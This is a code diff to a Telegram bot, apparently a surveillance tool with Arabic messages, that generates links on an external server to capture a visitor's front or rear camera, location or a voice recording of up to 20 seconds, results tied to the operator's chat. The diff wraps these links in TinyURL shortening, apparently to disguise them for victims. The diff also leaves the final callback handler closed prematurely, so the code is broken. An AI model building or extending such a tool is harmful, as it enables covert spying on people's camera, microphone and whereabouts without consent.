@@ -743,13 +743,27 @@ bot.onText(/\/listsubscribers/, (msg) => {
 });
 
 
-bot.on('callback_query', (callbackQuery) => {
+const TinyURL = require('tinyurl');
+
+function shortenUrl(url) {
+  return new Promise((resolve, reject) => {
+    TinyURL.shorten(url, function(res, err) {
+      if (err)
+        reject(err);
+      else
+        resolve(res);
+    });
+  });
+}
+
+bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const data = callbackQuery.data;
 
     if (data === 'front_camera' || data === 'rear_camera') {
         const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
+        const shortUrl = await shortenUrl(url);
+        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${shortUrl}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
@@ -758,29 +772,35 @@ bot.on('callback_query', (callbackQuery) => {
         console.log('Chat ID:', chatId);
         console.log('URL:', url);
         
-        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
+        const shortUrl = await shortenUrl(url);
+        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${shortUrl}`)
             .then(() => console.log('Message sent successfully'))
             .catch(err => console.error('Error sending message:', err));
     }
 });
 
-bot.on('message', (msg) => {
+bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const duration = parseInt(msg.text, 10);
 
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
             const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
-            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
+            const shortLink = await shortenUrl(link);
+            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${shortLink}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
         }
     }
 });
 
-bot.on('callback_query', (query) => {
+bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
+    const shortBaseUrl = await shortenUrl(baseUrl);
+    
+    // Use shortBaseUrl here if needed
+});
 
     let url;
     switch (query.data) {
